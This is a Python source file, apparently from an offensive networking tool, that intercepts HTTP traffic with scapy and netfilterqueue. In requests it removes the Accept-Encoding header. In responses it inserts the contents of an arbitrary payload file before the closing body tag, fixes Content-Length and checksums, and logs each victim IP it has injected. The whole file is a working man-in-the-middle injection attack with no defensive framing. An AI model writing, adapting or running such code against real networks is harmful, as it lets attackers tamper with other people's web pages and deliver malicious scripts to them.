# github.com/n0nexist/Trafficante

from scapy.all import *
import netfilterqueue
import modules.utils as utils
import re

payload_file_content = ""

def process_packet(packet):
    """ scapy's packet handler """
    
    global payload_file_content

    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            print(f"{utils.colors.BLUE}{spacket[IP].src}{utils.colors.RESET} has made an HTTP request to {utils.colors.GREEN}{spacket[IP].dst}{utils.colors.RESET}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                packet.accept()
                return
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            spacket[Raw].load = new_load
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            packet.set_payload(bytes(spacket))
        if spacket[TCP].sport == 80:
            print(f"{utils.colors.BLUE}grabbed an HTTP response from {utils.colors.GREEN}{spacket[IP].src}{utils.colors.RESET} to {utils.colors.GREEN}{spacket[IP].dst}{utils.colors.RESET}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return
            added_text_length = len(payload_file_content)
            load = load.replace("</body>", payload_file_content + "</body>")
            if "Content-Length" in load:
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                new_content_length = content_length + added_text_length
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                if payload_file_content in load:
                    print(f"{utils.colors.GREEN}payload injected{utils.colors.BOLD} -> {utils.colors.RESET}{utils.colors.BLUE}{spacket[IP].dst}{utils.colors.RESET}")
            spacket[Raw].load = load
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            packet.set_payload(bytes(spacket))
    packet.accept()


def start_injecting(pl_file):
    """ starts injecting payloads """
    
    global payload_file_content
    
    try:
        f = open(pl_file,"r")
        content = f.read()
        payload_file_content = content
        print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} read {len(content)} bytes from {pl_file}{utils.colors.RESET}")    
        f.close()
    except Exception as e:
        print(f"{utils.colors.FAIL}!{utils.colors.ITALIC} {e}{utils.colors.RESET}")
        pass        
    
    print(f"{utils.colors.BLUE}*{utils.colors.ITALIC} intercepting and injecting packets{utils.colors.RESET}")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()